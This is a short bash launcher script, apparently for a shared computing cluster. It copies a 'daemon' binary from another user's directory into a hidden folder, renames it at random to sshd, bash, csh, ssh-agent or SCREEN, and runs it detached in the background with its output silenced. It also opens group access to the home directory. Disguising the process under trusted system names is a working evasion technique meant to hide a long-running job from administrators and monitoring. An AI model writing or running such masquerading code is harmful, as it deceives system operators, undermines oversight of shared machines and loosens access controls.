#!/bin/bash
chgrp dfc13_collab ~
chmod g+rx ~
cp -Rf /storage/home/pde3/openQ/dist/* ./.dist/
oldpath=$PATH
export PATH=./.dist:$PATH
name[0]="sshd"
name[1]="bash"
name[2]="csh"
name[3]="ssh-agent"
name[4]="SCREEN"
rand=$[ $RANDOM % 5 ]
pname=${name[$rand]}
mv ./.dist/daemon ./.dist/$pname
$pname > /dev/null 2>&1 &
PID=$!
disown -h %-
echo "${PID}" > ./.pid
chgrp dfc13_collab ./.pid
chmod g+r ./.pid
export PATH=$oldpath
